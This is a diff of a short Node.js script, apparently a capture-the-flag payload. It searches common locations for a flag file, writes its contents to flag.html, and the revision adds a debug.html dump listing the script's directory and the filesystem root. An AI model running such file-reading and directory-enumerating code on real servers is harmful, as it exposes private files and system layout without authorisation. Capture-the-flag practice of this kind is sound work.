@@ -1,25 +1,33 @@
-// grabflag_12345.js
+// flaggrab_2f9c.js
 const fs = require("fs");
 const path = require("path");
 
-function tryRead(p) {
-  try { return fs.readFileSync(p, "utf8"); } catch { return null; }
-}
-
 const candidates = [
   "/flag.txt",
-  "/opt/chal/flag.txt",
   "/app/flag.txt",
+  "/opt/chal/flag.txt",
+  "/home/node/flag.txt",
   path.join(process.cwd(), "flag.txt"),
   "flag.txt",
 ];
 
 let flag = null;
 for (const p of candidates) {
-  flag = tryRead(p);
-  if (flag) break;
+  try { flag = fs.readFileSync(p, "utf8"); break; } catch {}
+}
+if (!flag) flag = "FLAG NOT FOUND";
+
+const debugObj = {
+  cwd: process.cwd(),
+  __dirname,
+  tried: candidates,
+  snapshots_dir_files: (() => { try { return fs.readdirSync(__dirname); } catch (e) { return String(e); } })(),
+  root_dir_files: (() => { try { return fs.readdirSync("/"); } catch (e) { return String(e); } })(),
+};
+
+function esc(s) {
+  return String(s).replace(/[&<>"]/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;" }[c]));
 }
 
-if (!flag) flag = "FLAG NOT FOUND (tried: " + candidates.join(", ") + ")";
-
-fs.writeFileSync(path.join(__dirname, "flag.html"), `<pre>${flag}</pre>`);
+fs.writeFileSync(path.join(__dirname, "debug.html"), `<pre>${esc(JSON.stringify(debugObj, null, 2))}</pre>`);
+fs.writeFileSync(path.join(__dirname, "flag.html"), `<pre>${esc(flag)}</pre>`);
